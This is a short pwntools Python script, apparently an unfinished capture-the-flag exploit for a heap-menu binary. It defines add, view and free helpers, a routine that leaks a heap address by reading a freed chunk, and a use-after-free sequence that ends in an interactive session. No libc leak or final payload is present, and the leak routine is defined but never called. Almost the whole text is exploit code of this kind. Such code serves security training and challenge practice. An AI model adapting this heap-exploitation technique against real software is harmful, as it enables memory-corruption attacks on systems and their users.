#!/usr/bin/python3

from pwn import *

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('0', 0)
else:
        p = process(exe.path)

GDB()
heap  = 0
libc.address = 0
def add(idx, payload):
        sla(b'>', '1')
        sla(b':', str(idx))
        sla(b':', payload)
def view(idx, payload):
        sla(b'>', '2')
        sla(b':', str(idx))
        sa(b'confirmation :', payload)
def free(idx):
        sla(b'>', '3')
        sla(b':', str(idx))
def leak_heap():
        global heap
        add(0,b'wan')
        free(0)
        view(0, b'wan')
        p.recvuntil(b'belongs to ')
        heap = u64(p.recvuntil(b'1', drop=True).ljust(8, b'\0'))- 0x1
        heap <<= 12

### UAF
add(0,b'wan')
add(1,b'wan')
add(2,b'wan')
free(0)
free(1)
free(2)
view(2, p64(1))


p.interactive()
